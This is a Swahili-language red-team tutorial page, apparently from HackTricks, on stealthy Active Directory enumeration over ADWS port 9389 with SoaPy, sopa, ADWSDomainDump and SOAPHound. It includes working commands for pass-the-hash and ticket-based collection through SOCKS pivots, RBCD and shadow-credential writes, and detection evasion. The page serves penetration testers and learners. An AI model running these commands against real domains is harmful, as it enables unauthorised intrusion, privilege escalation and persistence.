# Active Directory Web Services (ADWS) Enumeration na Ukusanyaji wa Kisiri

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) **huwezeshwa kwa chaguo-msingi kwenye kila Domain Controller tangu Windows Server 2008 R2** na husikiliza kwenye TCP **9389**. Licha ya jina lake, **hakuna HTTP inayohusika**. Badala yake, huduma hii hutoa data ya mtindo wa LDAP kupitia safu ya protocols za umiliki za .NET za uundaji wa fremu:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa kuwa trafiki imefungwa ndani ya fremu hizi za SOAP za binary na hupitia port isiyo ya kawaida, **enumeration kupitia ADWS ina uwezekano mdogo zaidi wa kukaguliwa, kuchujwa au kutambuliwa kwa saini kuliko trafiki ya kawaida ya LDAP/389 na 636**. Kwa waendeshaji, hii inamaanisha:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon ya siri zaidi – Blue teams mara nyingi hulenga LDAP queries.
* Uhuru wa kukusanya data kutoka kwa **hosts zisizo za Windows (Linux, macOS)** kwa kupitisha 9389/TCP kupitia SOCKS proxy.
* Data ileile unayopata kupitia LDAP (users, groups, ACLs, schema, n.k.) na uwezo wa kufanya **operations za kuandika** (kwa mfano, `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

Mawasiliano ya ADWS hutekelezwa kupitia WS-Enumeration: kila query huanza na ujumbe wa `Enumerate` unaobainisha LDAP filter/attributes na kurudisha GUID ya `EnumerationContext`, kisha hufuatiwa na ujumbe mmoja au zaidi wa `Pull` unaotiririsha matokeo hadi kufikia kiwango cha matokeo kilichowekwa na server.<sup>[[7]](#references)</sup> Contexts huisha baada ya takriban dakika 30, kwa hivyo zana zinahitaji kugawa matokeo katika kurasa au kugawa filters (queries za prefix kwa kila CN) ili kuepuka kupoteza state.<sup>[[8]](#references)</sup> Unapoomba security descriptors, bainisha control ya `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs; la sivyo, ADWS huondoa tu attribute ya `nTSecurityDescriptor` kwenye jibu lake la SOAP.

> NOTE: ADWS pia hutumiwa na zana nyingi za RSAT GUI/PowerShell, kwa hivyo trafiki inaweza kufanana na shughuli halali za wasimamizi.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji upya kamili wa protocol stack ya ADWS kwa Python safi**. Hutengeneza fremu za NBFX/NBFSE/NNS/NMF byte kwa byte, na hivyo kuwezesha ukusanyaji kutoka kwa mifumo inayofanana na Unix bila kutumia .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Sifa Muhimu

* Inasaidia **kupitisha trafiki kupitia SOCKS** (inafaa kutoka kwa C2 implants).
* Search filters zenye udhibiti wa kina, zinazofanana na LDAP `-q '(objectClass=user)'`.
* Operations maalum za **kuandika** kwa RBCD, SPNs, account flags na key credentials.<sup>[[2]](#references)</sup>
* Matokeo ya SOAPy yanaweza kuchanganuliwa na **BOFHound** na kuingizwa kwenye BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag ya `--parse` ya kuboresha muundo wa timestamps / `userAccountControl` inapohitajika yasomeke kwa binadamu.<sup>[[2]](#references)</sup>

### Flags za ukusanyaji maalum na operations za kuandika

SoaPy ina switches zilizochaguliwa kwa makini zinazotekeleza upya kazi za kawaida za LDAP hunting kupitia ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na options ghafi za `--query` / `--filter` za ukusanyaji maalum. Zitumia pamoja na primitives za kuandika kama `--rbcd <source>` (huweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (huweka SPN kwa ajili ya Kerberoasting maalum) na `--asrep` (huweka `DONT_REQ_PREAUTH` ndani ya `userAccountControl`).<sup>[[2]](#references)</sup>

Mfano wa utafutaji maalum wa SPN unaorudisha tu `samAccountName` na `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Tumia host/credentials zilezile ili kutumia mara moja matokeo kwa mashambulizi: dump objects ambazo tayari zimesanidiwa kwa RBCD ukitumia `--rbcds`, kisha tumia `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` kuweka tayari mnyororo wa Resource-Based Constrained Delegation (tazama [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa njia kamili ya abuse).<sup>[[2]](#references)</sup>

### Usakinishaji (host ya operator)

Sakinisha SOAPy CLI ya sasa kutoka kwenye upstream repository yake; jina la executable huzingatia herufi kubwa na ndogo kwenye mifumo inayofanana na Unix.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Ukusanyaji wa ticket pekee kupitia SOCKS pivot

Ikiwa foothold ina Kerberos ticket lakini haina plaintext password, badilisha ticket ya `.kirbi` kuwa `ccache` kama ilivyoelezwa kwenye [Pass the Ticket](pass-the-ticket.md), kisha elekeza SOAPy itumie cache hiyo. Ticket ya huduma ya LDAP ya DC inaweza kutumika katika workflow ya SOAPy ADWS iliyoandikwa; pitisha trafiki ya ADWS na Kerberos kupitia pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials kupitia ADWS

Ikiwa principal ya sasa inaweza kuandika kwenye `msDS-KeyCredentialLink` ya object lengwa, SOAPy inaweza kuongeza key credential kupitia ADWS na ku-export PFX inayolingana. Hifadhi DeviceID iliyorejeshwa ili kuiondoa kwa usahihi badala ya kufuta attribute nzima. Tumia PFX kwa PKINIT kama ilivyoelezwa katika [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump kupitia ADWS (Linux/Windows)

* Fork ya `ldapdomaindump` inayobadilisha maswali ya LDAP na miito ya ADWS kupitia TCP/9389 ili kupunguza ugunduzi wa LDAP-signature.
* Hufanya ukaguzi wa awali wa ufikikaji wa 9389 isipokuwa `--force` itumike (huruka uchunguzi huo ikiwa uchanganuzi wa port una kelele nyingi/umechujwa).
* Ilijaribiwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon, na README inaeleza kuwa ilifanikiwa kukwepa ugunduzi.<sup>[[4]](#references)</sup>

### Usakinishaji

```bash
pipx install .
```

### Matumizi

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Rekodi za kawaida za output huonyesha ukaguzi wa ufikikaji wa 9389, ADWS bind, na kuanza/kumalizika kwa dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Mteja wa vitendo wa ADWS katika Golang

Kama ilivyo kwa soapy, [sopa](https://github.com/Macmod/sopa) hutekeleza safu ya itifaki ya ADWS (MS-NNS + MC-NMF + SOAP) katika Golang, na kutoa flags za mstari wa amri za kutuma miito ya ADWS kama vile:<sup>[[5]](#references)</sup>

* **Utafutaji na upataji wa object** - `query` / `get`
* **Mzunguko wa maisha wa object** - `create [user|computer|group|ou|container|custom]` na `delete`
* **Uhariri wa attribute** - `attr [add|replace|delete]`
* **Usimamizi wa akaunti** - `set-password` / `change-password`
* na amri nyingine kama `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, n.k.

### Muhtasari wa ulinganifu wa itifaki

* Utafutaji wa mtindo wa LDAP hutumwa kupitia **WS-Enumeration** (`Enumerate` + `Pull`) pamoja na uchujaji wa attribute, udhibiti wa scope (Base/OneLevel/Subtree) na pagination.
* Upataji wa object moja hutumia **WS-Transfer** `Get`; mabadiliko ya attribute hutumia `Put`; ufutaji hutumia `Delete`.
* Uundaji wa object uliojengewa ndani hutumia **WS-Transfer ResourceFactory**; object maalum hutumia **IMDA AddRequest** inayoendeshwa na templates za YAML.
* Operesheni za password ni vitendo vya **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ugunduzi wa metadata bila uthibitishaji (mex)

ADWS hufichua WS-MetadataExchange bila credentials, na hivyo kutoa njia ya haraka ya kuthibitisha uwepo wa huduma kabla ya kufanya uthibitishaji:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Vidokezo kuhusu ugunduzi wa DNS/DC na kulenga Kerberos

Sopa inaweza kutafuta DC kupitia SRV ikiwa `--dc` haijatolewa na `--domain` imetolewa. Huuliza kwa mpangilio huu na kutumia lengwa lenye kipaumbele cha juu zaidi:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Kiutendaji, pendelea resolver inayodhibitiwa na DC ili kuepuka hitilafu katika mazingira yaliyogawanywa:

* Tumia `--dns <DC-IP>` ili uelekezaji wa **SRV/PTR/forward lookups** ufanyike kupitia DNS ya DC.
* Tumia `--dns-tcp` wakati UDP imezuiwa au majibu ya SRV ni makubwa.
* Ikiwa `--dc` ni IP, sopa hufanya utafutaji wa **reverse PTR** kila wakati: kichujio cha anwani cha ADWS `wsa:To` kinahitaji FQDN hata bila Kerberos. Toa FQDN ya DC moja kwa moja ikiwa reverse zone haipo.<sup>[[5]](#references)</sup>

Mfano (IP + Kerberos, DNS imelazimishwa kupitia DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Chaguo za nyenzo za uthibitishaji

Mbali na nywila za maandishi wazi, sopa inasaidia **NT hashes**, **Kerberos AES keys**, **ccache**, na **PKINIT certificates** (PFX au PEM) kwa uthibitishaji wa ADWS. Kerberos hutumika kiotomatiki unapotumia `--aes-key`, `-c` (ccache) au chaguo zinazotegemea certificate.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Uundaji wa object maalum kupitia templates

Kwa object classes yoyote, amri ya `create custom` hutumia template ya YAML inayolingana na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` na `rdn` hufafanua kontena na DN ya jamaa.
* `attributes[].name` inakubali `cn` au `addata:cn` yenye namespace.
* `attributes[].type` inakubali `string|int|bool|base64|hex` au `xsd:*` iliyobainishwa wazi.
* **Usijumuishe** `ad:relativeDistinguishedName` au `ad:container-hierarchy-parent`; sopa huziongeza.
* Thamani za `hex` hubadilishwa kuwa `xsd:base64Binary`; tumia `value: ""` kuweka string tupu.

## SOAPHound – Ukusanyaji wa ADWS kwa Kiwango Kikubwa (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni collector ya .NET inayofanya mwingiliano wote wa LDAP kupitia ADWS na kutoa JSON inayooana na BloodHound v4. Hujenga cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha huitumia tena kwa operesheni za `--bhdump`, `--certdump` (ADCS) au `--dnsdump` (DNS iliyounganishwa na AD) za kiwango kikubwa, ili ni takriban attributes 35 muhimu pekee zinazotoka kwenye DC. AutoSplit (`--autosplit --threshold <N>`) hugawa queries kiotomatiki kulingana na kiambishi awali cha CN ili yasivuke timeout ya dakika 30 ya EnumerationContext katika forests kubwa.<sup>[[8]](#references)</sup>

Mtiririko wa kawaida wa kazi kwenye VM ya operator iliyounganishwa na domain:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

JSON iliyohamishwa inaingia moja kwa moja kwenye workflows za SharpHound/BloodHound—tazama [BloodHound methodology](bloodhound.md) kwa mawazo ya graphing ya hatua zinazofuata. AutoSplit huifanya SOAPHound iwe thabiti kwenye forests zenye mamilioni ya objects huku ikiweka idadi ya queries chini kuliko snapshots za mtindo wa ADExplorer.

## Workflow ya Stealth AD Collection

Workflow ifuatayo inaonyesha jinsi ya kuorodhesha **vitu vya domain & ADCS** kupitia ADWS, kuvibadilisha kuwa BloodHound JSON na kutafuta attack paths zinazotegemea certificates – yote kutoka Linux:

1. **Elekeza tunnel ya 9389/TCP** kutoka kwenye mtandao lengwa hadi kwenye mashine yako (k.m. kupitia Chisel, Meterpreter, SSH dynamic port-forward, n.k.). Elekeza raw TCP client kupitia SOCKS kwa `proxychains4 SOAPy ...` (sanidi anwani ya SOCKS5 katika `proxychains4.conf`); `HTTPS_PROXY` haipeleki protocol hii isiyo ya HTTP kupitia proxy.<sup>[[9]](#references)</sup>

2. **Kusanya object ya root domain:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Kusanya vitu vinavyohusiana na ADCS kutoka Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Geuza kuwa BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Pakia ZIP** kwenye GUI ya BloodHound na uendeshe cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kupandisha mamlaka kupitia vyeti (ESC1, ESC8, n.k.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Ukiwa na ruhusa ya kuandika kwenye object ya kompyuta lengwa, tumia kitendo cha RBCD cha SOAPy badala ya mfuatano ghafi wa security descriptor. Hapa, `WEBSRV01$` ni chanzo kinachodhibitiwa na `FILE01$` ndiyo lengwa ambalo attribute yake inabadilishwa.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Endeleza mnyororo wa Kerberos S4U katika [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Muhtasari wa Zana

| Kusudi | Zana | Maelezo |
|---------|------|-------|
| Uhesabuji wa ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, kusoma/kuandika |
| Dump ya ADWS ya kiwango cha juu | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modi za BH/ADCS/DNS |
| Uingizaji kwenye BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha kumbukumbu za SoaPy/ldapsearch |
| Kulegeza vyeti | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS hiyohiyo |
| Uhesabuji wa ADWS na mabadiliko ya objects | [sopa](https://github.com/Macmod/sopa) | Client ya jumla ya kuwasiliana na endpoints za ADWS zinazojulikana - huruhusu uhesabuji, uundaji wa objects, marekebisho ya attributes, na mabadiliko ya nywila |



## References

- [1] [SpecterOps – Hakikisha Unatumia SOAP(y) – Mwongozo wa Waendeshaji wa Ukusanyaji wa AD kwa Stealth kwa Kutumia ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Vipimo vya MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Uhesabuji wa Stealth wa Mazingira ya Active Directory Kupitia ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Zana ya SOAPHound ya Kukusanya Data za Active Directory kupitia ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
